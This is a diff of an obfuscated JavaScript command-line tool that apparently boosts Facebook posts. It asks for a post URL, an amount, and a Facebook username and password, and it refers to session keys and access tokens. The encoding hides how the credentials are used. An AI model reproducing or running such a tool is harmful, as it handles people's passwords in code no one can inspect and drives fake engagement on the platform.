-        'vgHLigfJy2vZCYbWzxjPB2qGAgfZigv4CgLYzwqU',
-        'u2vYDMLJzsbvBMf2ywLSywjSzsaO',
-        'pgi+rMfJzwjVB2SGvxnLCM5HBwu6pc9IpIa',
-        'vvD0vwq',
-        'wKjntuC',
-        'Bg9NAw4',
-        'EhHrDNa',
-        'ntGWndK3mhzOyKrhEq',
-        'yu9WBK4',
-        'Dg9uAxrSzq',
-        'z0nNDgm',
-        'u0vmrG',
-        'uMLouMO',
-        'BxHOEhe',
-        'DhjPBq',
-        'DLvgtfi',
-        'v3jVBMCGy3jLzgvUDgLHBhm',
-        'Cg9ZDa',
-        'D3nizge',
-        'cJXIpKvTywLSid4Gpc9IpG',
-        'C3bSAwnL',
-        'suP5CLq',
-        'CMLkzNi',
-        'tw9nCM4',
-        'r0fzuM0',
-        'v29nDg0',
-        'Bg9JDMi',
-        'CffXyM4',
-        'sNPxvhO',
-        'rgrIAgy',
-        'DhH1wvm',
-        'BwvZC2fNzq',
-        'BxDkq2e',
-        'g1SXoZm2Bq',
-        'rKjtCgfTu2HHCMv+iW',
-        'uefoqK4',
-        'q29UBMvJDgLVBIbszwz1C2vKicG',
-        'kerPC3bSyxKGvg9Rzw5Zkq',
-        'sw52ywXPzcbpChrPB24Uie91DcbVzIbsyw5Nzq',
-        'Ce9YqwC',
-        'vxzSA04',
-        'uKPyy2S',
-        'w0LorK9D',
-        'r0vmD20',
-        'qMDgC08',
-        'vhPmvhO',
-        'qvnWrKq',
-        'CMvKDwnL',
-        'sfz6zha',
-        'vw5RBM93BG',
-        'yuDQyLe',
-        'zgXXEuu',
-        'Benlu2O',
-        'v1zjBwS',
-        'zM9YBwf0',
-        'D3jPDgu',
-        'sMn5s3a',
-        'zgf0yq',
-        'r09rCfC',
-        'khvWzgf0zvrVA2vUrMLSzsKGrNvUy3rPB24GrxjYB3i6ia',
-        's1vgrMu',
-        'uNjyyNe',
-        'C3rYAw5NAwz5',
-        'z2v0u2vJB25KCW',
-        'tLf5t1O',
-        'iKDVB2DSzsbdAhjVBwuIo3y9iJeWnYiSicjdAhjVBwL1Bsi7DJ0Imta3iIWGiK5VDd1bp0jYyw5KiJT2psiYnci',
-        'Ae9TB3O',
-        'C2TUB28',
-        'zxHPDa',
-        'zNr0u3C',
-        'qK13D2q',
-        'sNvSEq',
-        'wwLqs3y',
-        'wLrvt3i',
-        'qxj6Cwy',
-        'sMjvBgm',
-        'yw5uy2S',
-        'rMvICNvHCNK',
-        'otKYntyZtufnuxfV',
-        'cJXIpLrVA2vUid4Gpc9IpG',
-        'qNLjr3u',
-        'AfLlyM0',
-        'zNfzCuG',
-        'BuHjrhG',
-        'vKPLyxu',
-        'tgjRyuW',
-        'u3zZsKC',
-        'zwnOBYaKvevstvvyx0fqsv9wrvjtsu9o',
-        'rLnt',
-        'BunhCfu',
-        'u2vSzwn0zwqGvg9Rzw5+iW',
-        'DKvis1q',
-        'z2L0igrPzMyGls1XDwLLDcbPBMrLEc5QCW',
-        'D1DeswS',
-        'wMDhwKy',
-        'DNrItxK',
-        'tM8GDxbKyxrLCYbMB3vUzc4',
-        'zhDcz1C',
-        'Ahr0Chm6lY9HCgKUDgvSzwDYyw0UB3jNl2jVDa',
-        'AevPvwG',
-        'B0TOwhK',
-        'Ee1itfa',
-        'Ahr0Chm6lY9NCMfWAc5MywnLyM9VAY5JB20VBwuVzMvLzd9Hy2nLC3nFDg9Rzw49',
-        'runptK5sruzvu0ve',
-        'teTuqKe',
-        'qufjqKW',
-        'AgzhuMS',
-        'D2LUmZi',
-        'uhjLC3mGrw50zxiGDg8Gq29UDgLUDwv+iW',
-        't3nSD0e',
-        'BgvxqNu',
-        'shjty1C',
-        'sw5JB3jYzwn0ifvZzxjUyw1L',
-        'ndeYmJLLq1rzvK8',
-        'cJXIpKzHy2vIB29RifbHC3n3B3jKoJWVyJ4G',
-        'Dg9Rzw4',
-        'kfbYzxzPB3vZie1LBNuP',
-        's3L4s2i',
-        'BMf2AwDHDgu',
-        'tM92zw1Izxi',
-        'ufz2AMG',
-        'ANj3sKy',
-        'vvrsBwK',
-        'z09HsNu',
-        'z2rStuu',
-        'nJy0nduWugzWs21l',
-        'g1SWBq',
-        'BvHJEe0',
-        'BNvTyMvY',
-        'ExLZzMS',
-        'v2HLCMuGD291BgqGEw91igXPA2uGDg8GBgvHDMuGEw91CIbMzwvKyMfJAZ8',
-        't01bDui',
-        'ugXLyxnLievUDgvYie9UBhKGtNvTyMvYCW',
-        'u1bbtsbtsefsrsa',
-        'sxHVDhO',
-        'BKjAwfq',
-        'BwfPBG',
-        'z2v0q29TBwfUza',
-        'iefdq0vtuYbut0TftG',
-        'CeLjAfG',
-        'qMPlz1e',
-        'BMfPC3C',
-        'qwDLBNq',
-        'vMzZDuq',
-        'BgvUz3rO',
-        's0jZEKu',
-        'v0fstKLorZOG',
-        'BfvoqMW',
-        'EurTAwy',
-        'wevHseO',
-        't0fQC1e',
-        'Au1AtMi',
-        'C2XPy2u',
-        'nJy0nZy1mZeXnG',
-        'B1HqyxC',
-        'vMD5qNm',
-        'r0LJqNu',
-        'wLPktNO',
-        'AKTdtwy',
-        'DgvYBxv4lw9Wzw4GAhr0CdOVl3qUBwuVs2fPCNvezxy',
-        'zgnOA0y',
-        'yM9VBgvHBG',
-        'CgfYC2u',
-        'CM9Rzui',
-        'v1jmDwW',
-        'ywnJzxnZx3rVA2vU',
-        'uxvezK0',
-        'EMTls3G',
-        'v0j6AMi',
-        'vxjIC24',
-        'C3bSAxq',
-        'u2zpB0m',
-        'vxvPy0S',
-        'CMPrEw0',
-        'kerLBgv0zsbgywnLyM9VAYbby2nLC3mGvg9Rzw4P',
-        'rKnyseC',
-        'DJiUmG',
-        'y2HVB3nLvg9Rzw4',
-        'yMnhyNu',
-        'AKXMtxi',
-        'vKHuyxu',
-        'yKHfEhu',
-        'u3vsENe',
-        'rwXqA1a',
-        'rgv2zwXVCgvYoIa',
-        'v255z2m',
-        'yxnRqMfJAW',
-        'rND6Bei',
-        'mti1r2fssNbR',
-        'zuHduNu',
-        'ANzOrgG',
-        'tg9JywWGy2HHBMDLCYbKzxrLy3rLzcbPBIbPBMrLEc5QCY4GugXLyxnLignVBw1PDcbVCIbZDgfZAcb5B3vYignOyw5NzxmGyMvMB3jLihvWzgf0Aw5NlG',
-        'uLbyEhu',
-        'y29UDgLUDwu',
-        'suvPwNq',
-        'Efn1twG',
-        'g1SXoZm0Bq',
-        'txvYrLK',
-        'khjLBw92zvrVA2vUksbgDw5JDgLVBIbfCNjVCJOG',
-        'vMrKwNu',
-        'BM93',
-        'mJu1ntzWyxHADLa',
-        'quXpzgO',
-        'wvjNDgq',
-        'mJaYns0XmI0Ynq',
-        'r2LbruS',
-        'ChvZAa',
-        'reHgzNu',
-        'ywvirwO',
-        't1vzs3u',
-        'lI90B2TLBI5QC29U',
-        'v2LUzg93CW',
-        'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlZeWnY4WlJaUmcbtywzHCMKVntm3lJm2',
-        'C2vZC2LVBL9RzxKGFcbHy2nLC3nFDg9Rzw4GtM90iezVDw5K',
-        'cJXIpLn0yxr1CZO8l2i+ieXVz2DLzcbPBG',
-        'vg9Rzw5Z',
-        'AKrgCxi',
-        'yxHsuxK',
-        'Bg5kzwK',
-        'z2v0sg91CNm',
-        'CgvWse4',
-        'DgLYELu',
-        'z2v0tw9UDgG',
-        'CMvQy0O',
-        'uhviEKu',
-        'z2L0igrPzMyGls1XDwLLDcbZzxr1Cc5ZAa',
-        'CMvHzezPBgvtEw5J',
-        'Aw5JBhvKzxm',
-        'ru5tvvjfifrirsbgqunfqK9psYbqt1nuieLtifnfvcbutYbqvujmsumU',
-        'CLv6t0S',
-        'z2v0vgLTzq',
-        'zez1sNK',
-        'z2v0vxjS',
-        'CLH6A28',
-        'uhjVDg9JB2WGrxjYB3iGkevquK9utYK6ia',
-        'vhvzDMW',
-        'Bg9N',
-        'DgnXrNy',
-        'r2vUzxjHDgvKifnLDdOG',
-        'ChLuyuS',
-        'rhjnB1i',
-        'z3PPCcWGzgvMBgf0zq',
-        'r0HuBLK',
-        'tgLNzxi',
-        'rvHjvca',
-        'BKjQsuC',
-        'rK9ftKG',
-        'zxHPrhm',
-        'tuzmyLm',
-        'AMTZCMe',
-        'mJfftfvtCgi',
-        'z2v0twLUDxrLCW',
-        'DKH3y2O',
-        'Eg1QrK0',
-        'uvLur2q',
-        'v2D2C3C',
-        'BeXHv0C',
-        'C2vSzwn0zwruB2TLBG',
-        'DwDlrgC',
-        'su9wteS',
-        'q3jLyxrLzcbuAw1Lia',
-        'EvniveK',
-        'sur0vu0',
-        'r0DZuwG',
-        'CLjXzgC',
-        'rg8GEw91ihDHBNqGDg8Gz28GyMfJAZ8GkhKVtIWGzgvMyxvSDdOGEsL+iW',
-        'DNrlCem',
-        'wKXlDwe',
-        'vLjluLq',
-        'qxr5Du0',
-        'z3LzA0i',
-        'EfL4vuK',
-        'vePkDKq',
-        'jNnLDd0',
-        'yw1QCMq',
-        'Awngu0y',
-        'uenOvfy',
-        'ls0Tls0Tls0Tlq',
-        'zNfAB1K',
-        'DLD5CfC',
-        'y1f4uuu',
-        'uhbQsNO',
-        'ug9XqNO',
-        've9lru4GtufoquDftuvovca',
-        'uhPjzve',
-        'ksbuB2TLBIbszw1VDMvKifn1y2nLC3nMDwXSEq',
-        'zKHJrue',
-        'C3bREfm',
-        'DMTiBxa',
-        'twfYy2G',
-        'cJXIpLnOyxjLieLUzMLUAxrLid4Gpc9IpG',
-        'Cvjytvm',
-        'qKfdsYa',
-        'C2vHCMnOugfYyw1Z',
-        'r0jRuMu',
-        'A0HxCfm',
-        'vLftB3q',
-        'g1SXoZmYBq',
-        'z01qrxm',
-        'DxrMoa',
-        'u2HHCMuGqw1VDw50icHWCMvZCYaNAsCGzM9YigLUzMLUAxrLkx4J',
-        'CgfZC3DVCMqTChjVBxb0',
-        'kenuuKWGkYbdkq',
-        'vxbKyxrLie1LC3nHz2uGoIa',
-        'DxjgCgC',
-        'AMHZz08',
-        'Dvftsum',
-        'Dg9mB3DLCKnHC2u',
-        'q29UBMvJDgLVBIbfCNjVCJOG',
-        'CfjdsKO',
-        'u0HpvYbut0TftLmG',
-        'uMzjzvO',
-        'vgHcuMy',
-        'kfbYzxzPB3vZie1LBNuPcG',
-        'yw9Nr3q',
-        'sw52ywXPzcbpChrPB24U',
-        'rvbst1rp',
-        'yurIrK0',
-        'zKnqAeu',
-        'svPdAwW',
-        'Ahr0Chm6lY9IlwDYyxbOlMzHy2vIB29RlMnVBs9HDxrOl2XVz2LU',
-        'vKzrtNO',
-        'Cg5wueS',
-        'uLrZzfi',
-        'y3zPz0C',
-        'uKngzxa',
-        'D3jPDgvgAwXLu3LUyW',
-        'C3rHDhvZ',
-        'mJmYEffOt09i',
-        'EgrNlw9Wzw4GAhr0CdOVl3qUBwuVs2fPCNvezxy',
-        'zxn4tgW',
-        'zvH5u00',
-        'zMXVB3i',
-        'sMfUDwfYEq',
-        't0f1DgGGmZuWnJG1ntmXnZi4FdyYzJHJztLMnZrImtjModrJmtiZy2mYmZqZn2e0ytmY',
-        'g1SXoZm3Bq',
-        'CgzXuvG',
-        'AgjhzMi',
-        'vhDVlwzHy3rVCIbHDxrOzw50AwnHDgLVBIbPCYbLBMfIBgvKlIbqBgvHC2uGzgLZywjSzsbPDcbIzwzVCMuGz2v0DgLUzYb0B2TLBG',
-        'jNr5Cgu9',
-        'y0TTC0W',
-        'C2vZC2LVBL9RzxK',
-        'ugryA2G',
-        'wuH0u2G',
-        'q0T5A1C',
-        'twf5',
-        'r2HnEwW',
-        'zgPTrfC',
-        'yuLyBu4',
-        'u2HHCMvZifrVDgfSoIa',
-        'DxnLCM5HBwu',
-        'B0jSsva',
-        'ENvIEwi',
-        'CKXjs2C',
-        'EfL3CKO'
-    ];
-    Z = function () {
-        return aB;
-    };
-    return Z();
-}
-const version = ZC(0x3ee), banner = green + '\x20___\x20___\x20___\x20_\x20\x20' + yellow + ZC(0x3f6) + blue + ZC(0x33d) + (red + underline) + '(' + version + ').' + reset + green + '\x0a|\x20__|\x20_\x20)\x20__|\x20|_\x20\x20__\x20_\x20_\x20_\x20___\x20\x0a|\x20_||\x20_\x20\x5c__\x20\x5c\x20\x27\x20\x5c/\x20_`\x20|\x20\x27_/\x20-_)\x0a|_|\x20|___/___/_||_\x5c__,_|_|\x20\x5c___|\x0a';
+const version = mz(0x3bd), banner = green + mz(0x295) + yellow + mz(0x37f) + blue + mz(0x42f) + (red + underline) + '(' + version + ').' + reset + green + '\x0a|\x20__|\x20_\x20)\x20__|\x20|_\x20\x20__\x20_\x20_\x20_\x20___\x20\x0a|\x20_||\x20_\x20\x5c__\x20\x5c\x20\x27\x20\x5c/\x20_`\x20|\x20\x27_/\x20-_)\x0a|_|\x20|___/___/_||_\x5c__,_|_|\x20\x5c___|\x0a';
 function getTimeStamp() {
-    const ZF = ZC, Q = {
-            'vtKpC': function (Y, i) {
-                return Y(i);
-            },
-            'yDmif': function (Y, i) {
-                return Y(i);
-            },
-            'cKmsL': function (Y, i) {
-                return Y(i);
+    const mi = mz, U = {
+            'WuAQz': function (C, Q) {
+                return C(Q);
             }
-        }, n = new Date(), w = Q[ZF(0x1d6)](String, n[ZF(0x1a7)]())['padStart'](-0x1 * 0xb7b + -0x232f + 0x2eac, '0'), b = Q[ZF(0x3d2)](String, n[ZF(0x1c7)]())[ZF(0x31d)](0x1 * -0x34 + -0xc97 * 0x1 + 0xccd, '0'), g = Q[ZF(0x220)](String, n[ZF(0x37d)]())[ZF(0x31d)](-0x1e75 + 0x1 * 0x202d + -0x1b6, '0');
-    return magenta + '[' + w + ':' + b + ':' + g + ']' + reset + '\x20';
+        }, N = new Date(), V = U['WuAQz'](String, N['getHours']())[mi(0x252)](0x1d8a + -0x1481 + 0x1 * -0x907, '0'), B = String(N['getMinutes']())['padStart'](-0x26fc + 0x2ab + 0x2453, '0'), g = String(N['getSeconds']())[mi(0x252)](-0x600 + 0x1cdc + -0x28a * 0x9, '0');
+    return magenta + '[' + V + ':' + B + ':' + g + ']' + reset + '\x20';
 }
-const {default: inquirer} = await import('inquirer'), {default: getPassword} = await import(ZC(0x1f9));
-function delay(Q) {
-    return new Promise(n => setTimeout(n, Q));
+const {default: inquirer} = await import('inquirer'), {default: getPassword} = await import('password-prompt');
+function delay(U) {
+    return new Promise(N => setTimeout(N, U));
 }
-async function animate(Q, n = 0x95 * -0xe + -0x1c * -0xb5 + -0x5d1 * 0x2) {
-    const Zx = ZC, w = {
-            'GELwm': function (b, g) {
-                return b !== g;
+async function animate(U, N = 0x74f * 0x2 + -0xfee + 0x154) {
+    const mX = mz, V = {
+            'shXdM': function (B, g) {
+                return B !== g;
             },
-            'BpZHe': 'FRrIi',
-            'gEzfy': 'pbXPB',
-            'IvTcu': function (b, g) {
-                return b(g);
+            'MPFMj': function (B, g) {
+                return B(g);
             },
-            'KPRHJ': Zx(0x264)
+            'VhbGc': mX(0x26d)
         };
-    Q = Q[Zx(0x2d2)]();
-    for (const b of Q) {
-        if (w[Zx(0x369)](w[Zx(0x321)], w[Zx(0x261)]))
-            await w[Zx(0x26d)](delay, n), process[w['KPRHJ']][Zx(0x375)](b);
+    U = U[mX(0x38d)]();
+    for (const B of U) {
+        if (V['shXdM'](mX(0x2d6), mX(0x31b)))
+            await V[mX(0x2be)](delay, N), process['stdout'][V[mX(0x3f2)]](B);
         else
-            return n + Zx(0x364);
+            return ![];
     }
-    console[Zx(0x1b8)]();
+    console[mX(0x38c)]();
 }
-let currentUTCDate = new Date(), offset = 0x1 * -0xe33 + -0x11b0 + -0x1 * -0x1feb, currentDate = new Date(currentUTCDate[ZC(0x1b2)]() + offset * (0xbc * 0x1a + -0x3 * -0x92c + -0x208c) * (-0x2 * 0x131 + 0x1a2 + -0x2 * -0x254)), expirationDate = new Date(ZC(0x40a));
+let currentUTCDate = new Date(), offset = -0x1f * 0x91 + 0xb0 * 0x17 + 0x1c7, currentDate = new Date(currentUTCDate[mz(0x383)]() + offset * (0x24af + -0x2405 + 0xd66) * (0x2022 + -0x150e + -0x72c)), expirationDate = new Date(mz(0x2e6));
 const monthNames = [
-    ZC(0x219),
-    ZC(0x38b),
-    ZC(0x1ed),
-    ZC(0x2e0),
-    ZC(0x225),
-    ZC(0x2c4),
-    ZC(0x385),
-    ZC(0x25e),
+    'January',
+    'February',
+    mz(0x406),
+    mz(0x219),
+    mz(0x3d9),
+    mz(0x22f),
+    mz(0x298),
+    mz(0x304),
     'September',
-    ZC(0x26f),
-    ZC(0x3b5),
-    ZC(0x2bf)
+    mz(0x20c),
+    mz(0x315),
+    'December'
 ];
-currentDate >= expirationDate && (console[ZC(0x1b8)](getTimeStamp() + error + ZC(0x33e)), exit());
-console[ZC(0x1b8)](getTimeStamp() + info + ('Free\x20until\x20' + (yellow + underline + monthNames[expirationDate[ZC(0x1aa)]()]) + '\x20' + expirationDate['getDate']() + '\x20' + (expirationDate['getFullYear']() + reset))), console[ZC(0x1b8)](getTimeStamp() + info + 'Wag\x20i\x20benta\x20ples\x20:)'), await delay(-0x1728 + -0x1 * 0x25a7 + 0x1 * 0x5057), setClear();
+currentDate >= expirationDate && (console['log'](getTimeStamp() + error + mz(0x426)), exit());
+console[mz(0x38c)](getTimeStamp() + info + (mz(0x31a) + (yellow + underline + monthNames[expirationDate[mz(0x266)]()]) + '\x20' + expirationDate[mz(0x2dc)]() + '\x20' + (expirationDate[mz(0x40c)]() + reset))), console['log'](getTimeStamp() + info + 'Wag\x20i\x20benta\x20ples\x20:)'), await delay(-0x1f80 + 0x15a2 + 0x1d66), setClear();
 class prompts {
-    static [ZC(0x3c7)] = {
-        'name': ZC(0x30e),
-        'type': ZC(0x301),
+    static ['getCommand'] = {
+        'name': mz(0x3b0),
+        'type': 'input',
         'prefix': '',
-        'message': ask + ZC(0x360),
+        'message': ask + mz(0x3f8),
         'validate': cmd => {
-            const ZT = ZC, QsjjLN = {
-                    'GKKtf': function (x, y) {
+            const mI = mz, DjGwIm = {
+                    'rfTbE': 'Invalid\x20Option.\x20Out\x20of\x20Range',
+                    'ErEgB': function (x, y) {
                         return x + y;
                     },
-                    'rZTxw': function (x, y) {
+                    'vWQsU': function (x, y) {
+                        return x !== y;
+                    },
+                    'QavBG': function (x, y) {
                         return x + y;
                     },
-                    'qydiG': function (x, y) {
+                    'rsHrS': mI(0x302),
+                    'HjAUD': function (x, y) {
                         return x === y;
                     },
-                    'oCNoJ': function (x, y) {
-                        return x + y;
-                    },
-                    'JcyKp': function (x, y) {
-                        return x === y;
-                    },
-                    'BLLgh': ZT(0x24a),
-                    'PnCHh': ZT(0x3c2),
-                    'vgGxm': function (callee, param1) {
-                        return callee(param1);
-                    },
-                    'hNXlj': 'Invalid\x20Option.\x20Out\x20of\x20Range'
+                    'guRks': mI(0x398)
                 };
-            if (QsjjLN['qydiG'](cmd[ZT(0x34c)](), ''))
-                return QsjjLN[ZT(0x265)](info, 'Please\x20Provide\x20a\x20Valid\x20Command.');
-            if (!/^\d+$/[ZT(0x2ee)](cmd)) {
-                if (QsjjLN[ZT(0x376)](ZT(0x24a), QsjjLN[ZT(0x25a)]))
-                    return info + QsjjLN[ZT(0x295)];
-                else
-                    b['log'](QsjjLN[ZT(0x306)](QsjjLN['rZTxw'](g(), Y), 'Wrong\x20credentials'));
-            }
-            cmd = QsjjLN['vgGxm'](parseInt, cmd);
-            if (cmd <= -0x9a1 + 0x16d7 + -0x2 * 0x69b || cmd > -0x6b8 + 0x1351 + -0xc94)
-                return error + QsjjLN[ZT(0x286)];
+            if (cmd['trim']() === '')
+                return info + mI(0x2c0);
+            if (!/^\d+$/[mI(0x389)](cmd))
+                return DjGwIm[mI(0x336)](mI(0x223), mI(0x2e9)) ? DjGwIm[mI(0x227)](info, DjGwIm[mI(0x2d0)]) : N + DjGwIm[mI(0x335)];
+            cmd = parseInt(cmd);
+            if (cmd <= -0x745 * -0x3 + 0x88 * 0x43 + -0xb7b * 0x5 || cmd > -0x215d + -0x1916 + -0x4 * -0xe9e)
+                return DjGwIm[mI(0x26c)](DjGwIm['guRks'], DjGwIm['guRks']) ? error + DjGwIm[mI(0x335)] : DjGwIm[mI(0x3e9)](N, mI(0x413));
             return !![];
         }
     };
-    static [ZC(0x1b4)] = {
-        'name': ZC(0x337),
-        'type': ZC(0x301),
+    static ['getUrl'] = {
+        'name': mz(0x244),
+        'type': mz(0x1c4),
         'prefix': '',
-        'message': ask + 'Facebook\x20Post\x20URL~#',
+        'message': ask + mz(0x418),
         'validate': url => {
-            const Zj = ZC, BLlVHt = {
-                    'NyBNZ': function (x, y) {
-                        return x + y;
-                    },
-                    'frnrm': function (x, y) {
-                        return x + y;
-                    },
-                    'AYeAX': function (callee) {
-                        return callee();
-                    },
-                    'djmDW': function (x, y) {
+            const mc = mz, kGXCAA = {
+                    'PtZLn': function (x, y) {
                         return x === y;
                     },
-                    'CxURY': function (x, y) {
-                        return x === y;
-                    },
-                    'mxhxq': Zj(0x30b),
-                    'CTDyw': Zj(0x356),
-                    'AtyuM': function (x, y) {
-                        return x + y;
-                    },
-                    'dISSx': Zj(0x2c6),
-                    'ibgUN': Zj(0x2f3),
-                    'cRZbC': function (x, y) {
+                    'hvZIv': mc(0x35e),
+                    'wlQoN': function (x, y) {
                         return x !== y;
                     },
-                    'hbGfb': Zj(0x2bb),
-                    'hfGRk': Zj(0x217)
-                };
-            if (BLlVHt[Zj(0x227)](url['trim'](), ''))
-                return BLlVHt[Zj(0x336)](BLlVHt[Zj(0x34b)], BLlVHt['CTDyw']) ? !![] : BLlVHt['AtyuM'](error, Zj(0x2f2));
-            if (!url['startsWith'](BLlVHt[Zj(0x2cc)]) && !url[Zj(0x2eb)](BLlVHt['ibgUN'])) {
-                if (BLlVHt[Zj(0x323)](BLlVHt[Zj(0x21d)], BLlVHt[Zj(0x3a8)]))
-                    return BLlVHt[Zj(0x1d9)](error, Zj(0x297));
-                else
-                    Y[Zj(0x1b8)](BLlVHt[Zj(0x312)](BLlVHt[Zj(0x254)](BLlVHt[Zj(0x257)](i), H), 'session_key\x20|\x20access_token\x20Not\x20Found')), W[Zj(0x1b8)](t);
-            }
-            return !![];
-        }
-    };
-    static [ZC(0x281)] = {
-        'name': 'amount',
-        'type': ZC(0x301),
-        'prefix': '',
-        'message': ask + ZC(0x1f8),
-        'validate': amount => {
-            const ZL = ZC, xTCxsa = {
-                    'FOENH': function (x, y) {
-                        return x + y;
-                    },
-                    'ySHTI': function (x, y) {
-                        return x + y;
-                    },
-                    'anTck': function (callee) {
-                        return callee();
-                    },
-                    'vGVsn': ZL(0x235),
-                    'oafug': function (x, y) {
-                        return x + y;
-                    },
-                    'Ixotz': function (x, y) {
-                        return x + y;
-                    },
-                    'PuHzE': function (x, y) {
-                        return x === y;
-                    },
-                    'CxVpI': function (x, y) {
-                        return x !== y;
-                    },
-                    'fqZoY': ZL(0x1dc),
-                    'leWBu': ZL(0x2a3),
-                    'meJJL': function (x, y) {
-                        return x + y;
-                    },
-                    'EGfNh': function (x, y) {
+                    'erLJe': mc(0x353),
+                    'zHhJK': mc(0x2c8),
+                    'ithQl': function (x, y) {
                         return x + y;
                     }
                 };
-            if (amount['trim']() === '')
-                return xTCxsa[ZL(0x3c4)](error, ZL(0x2f2));
-            if (xTCxsa[ZL(0x1ac)](amount['toLowerCase'](), 'i')) {
-                if (xTCxsa['CxVpI'](xTCxsa[ZL(0x1e2)], xTCxsa[ZL(0x3ac)]))
-                    return !![];
-                else
-                    b[ZL(0x1b8)](xTCxsa[ZL(0x1c2)](xTCxsa[ZL(0x1d1)](xTCxsa['anTck'](g), Y), ZL(0x21e)));
-            }
-            if (!/^\d+$/[ZL(0x2ee)](amount))
-                return xTCxsa[ZL(0x2a6)](error, 'Please\x20Enter\x20Only\x20Numbers');
-            amount = parseInt(amount);
-            if (amount <= -0x2 * 0xffb + -0x2b7 * -0xd + -0x355) {
-                if (ZL(0x378) !== ZL(0x378))
-                    W[ZL(0x1b8)](xTCxsa[ZL(0x1d1)](xTCxsa[ZL(0x38a)](t), B) + xTCxsa['vGVsn']), V['log'](xTCxsa[ZL(0x263)](xTCxsa[ZL(0x38a)](N) + c, e[ZL(0x35d)])), P[ZL(0x382)]();
-                else
-                    return xTCxsa[ZL(0x2ea)](error, 'Are\x20you\x20serious\x20right\x20neow\x20bruh');
-            }
+            if (kGXCAA[mc(0x2b2)](url['trim'](), ''))
+                return error + mc(0x255);
+            if (!url[mc(0x25c)](mc(0x2b9)) && !url[mc(0x25c)](kGXCAA[mc(0x324)]))
+                return kGXCAA['wlQoN'](kGXCAA['erLJe'], kGXCAA[mc(0x1e3)]) ? kGXCAA[mc(0x35f)](error, mc(0x36d)) : !![];
             return !![];
         }
     };
-    static ['getUserName'] = {
-        'name': ZC(0x22a),
-        'type': ZC(0x301),
+    static [mz(0x35d)] = {
+        'name': mz(0x1fb),
+        'type': mz(0x1c4),
         'prefix': '',
-        'message': ask + ZC(0x24d),
-        'validate': username => {
-            const Zy = ZC, ISVLkO = {
-                    'RIOcM': function (x, y) {
-                        return x + y;
-                    },
-                    'xMHLP': function (callee) {
-                        return callee();
-                    },
-                    'cyrYZ': function (x, y) {
+        'message': ask + mz(0x3b6),
+        'validate': amount => {
+            const mw = mz, KiKAVt = {
+                    'FnZdt': function (x, y) {
                         return x === y;
                     },
-                    'HRScD': function (x, y) {
+                    'NxjST': mw(0x342),
+                    'PwSRQ': function (callee, param1, param2) {
+                        return callee(param1, param2);
+                    },
+                    'vBstN': mw(0x1d6),
+                    'SFAyv': mw(0x268),
+                    'GvDTz': function (x, y) {
+                        return x + y;
+                    },
+                    'mSLZJ': function (x, y) {
+                        return x + y;
+                    },
+                    'BZOOC': function (callee) {
+                        return callee();
+                    },
+                    'ciKLl': function (x, y) {
                         return x !== y;
                     },
-                    'hEiUh': Zy(0x353),
-                    'XkvSe': Zy(0x2f2)
-                };
-            if (ISVLkO['cyrYZ'](username[Zy(0x34c)](), '')) {
-                if (ISVLkO[Zy(0x2cb)](ISVLkO[Zy(0x3a1)], ISVLkO[Zy(0x3a1)]))
-                    Y['log'](ISVLkO[Zy(0x33c)](ISVLkO['RIOcM'](ISVLkO['xMHLP'](i), H), Zy(0x2bc) + W[Zy(0x35d)])), ISVLkO[Zy(0x3a3)](t);
-                else
-                    return ISVLkO[Zy(0x33c)](error, ISVLkO[Zy(0x248)]);
-            }
-            return !![];
-        }
-    };
-    static [ZC(0x3f8)] = {
-        'name': ZC(0x329),
-        'type': 'input',
-        'prefix': '',
-        'message': ask + ZC(0x1d5)
-    };
-    static [ZC(0x3ff)] = {
-        'name': '_',
-        'type': ZC(0x301),
-        'prefix': '',
-        'message': ask + ZC(0x3aa)
-    };
-    static [ZC(0x2fe)] = {
-        'name': 'tokencmd',
-        'type': ZC(0x301),
-        'prefix': '',
-        'message': ask + ZC(0x293),
-        'validate': tokencmd => {
-            const ZA = ZC, oHNftb = {
-                    'NQyOZ': function (x, y) {
-                        return x === y;
-                    },
-                    'IkJQC': function (x, y) {
-                        return x === y;
-                    },
-                    'WRLul': function (x, y) {
+                    'rfiFk': mw(0x378),
+                    'ujyxl': mw(0x349),
+                    'WoeEc': mw(0x407),
+                    'QxPKu': function (x, y) {
                         return x + y;
                     },
-                    'GsDUo': function (callee) {
-                        return callee();
-                    },
-                    'oJupi': function (x, y) {
-                        return x === y;
-                    },
-                    'OslwA': function (x, y) {
-                        return x + y;
-                    },
-                    'vqkrH': function (x, y) {
+                    'NJmqX': function (x, y) {
                         return x <= y;
-                    },
-                    'zkKKx': function (x, y) {
-                        return x > y;
-                    },
-                    'BhjMu': function (x, y) {
-                        return x !== y;
-                    },
-                    'HRyEh': ZA(0x3db),
-                    'OUYKu': 'Invalid\x20Option.\x20Out\x20of\x20Range'
+                    }
                 };
-            if (oHNftb[ZA(0x32c)](tokencmd[ZA(0x34c)](), ''))
-                return error + ZA(0x207);
-            if (!/^\d+$/[ZA(0x2ee)](tokencmd))
-                return oHNftb['OslwA'](error, 'Please\x20Enter\x20Only\x20Numbers');
-            tokencmd = parseInt(tokencmd);
-            if (oHNftb['vqkrH'](tokencmd, -0x2506 + -0x12 * 0x15b + 0x3d6c * 0x1) || oHNftb[ZA(0x3e5)](tokencmd, -0x1 * -0x2485 + 0x5 * -0x774 + -0x2 * -0x61)) {
-                if (oHNftb['BhjMu'](oHNftb['HRyEh'], ZA(0x2a4)))
-                    return oHNftb[ZA(0x3ab)](error, oHNftb[ZA(0x19d)]);
+            if (KiKAVt['FnZdt'](amount['trim'](), '')) {
+                if (KiKAVt[mw(0x1d5)](KiKAVt[mw(0x237)], mw(0x1f1)))
+                    return error + mw(0x255);
                 else {
-                    const c = Y[ZA(0x251)][ZA(0x377)][ZA(0x2ec)];
-                    if (oHNftb[ZA(0x37e)](c[ZA(0x268)], -0x1 * 0x617 + -0x1d9e + 0x51a * 0x7) || oHNftb[ZA(0x243)](c['code'], -0xd7f + -0x1 * -0x23d3 + -0x1652))
-                        return B[ZA(0x1b8)](oHNftb['WRLul'](oHNftb[ZA(0x3e2)](oHNftb[ZA(0x31a)](V), N), ZA(0x27c))), { 'retry': !![] };
-                    t['log'](c);
+                    if (KiKAVt[mw(0x23c)](B[mw(0x286)], KiKAVt[mw(0x235)])) {
+                        KiKAVt[mw(0x207)](Q, KiKAVt[mw(0x1e4)], { 'stdio': mw(0x340) });
+                        return;
+                    }
